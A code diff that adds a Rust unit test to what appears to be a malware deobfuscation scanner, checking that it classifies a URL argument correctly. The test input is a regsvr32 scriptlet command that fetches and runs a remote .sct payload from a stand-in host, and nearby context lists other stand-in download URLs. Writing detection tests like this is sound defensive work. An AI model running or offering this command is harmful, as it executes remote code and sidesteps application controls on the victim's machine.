@@ -10851,6 +10851,29 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn regsvr32_scriptlet_url_argument_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "http://regsvr32-scriptlet.example/payload.sct";
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"regsvr32 /s /n /u /i:{url} scrobj.dll"#),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )
+        });
+        assert!(has, "regsvr32 scriptlet URL not typed: {:?}", env.traits);
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "regsvr32 scriptlet URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn mangled_short_webclient_de_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "http://tvde.m/e/pt.zp";
